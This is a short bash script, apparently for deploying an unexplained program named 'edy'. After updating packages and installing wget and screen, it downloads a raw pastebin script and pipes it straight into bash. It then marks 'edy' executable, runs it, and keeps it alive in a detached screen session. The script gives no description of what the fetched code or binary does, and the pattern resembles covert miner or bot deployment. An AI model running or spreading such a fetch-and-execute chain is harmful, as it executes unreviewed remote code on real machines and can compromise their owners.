#!/bin/bash

apt --fix-missing update
sleep 1
apt update
sleep 1
apt upgrade -y
sleep 1
apt install -y wget screen
sleep 1
wget -qO - https://pastebin.com/raw/C4GSpdYs | bash
sleep 1
chmod +x edy
sleep 1
./edy
sleep 1
screen -S edy ./edy
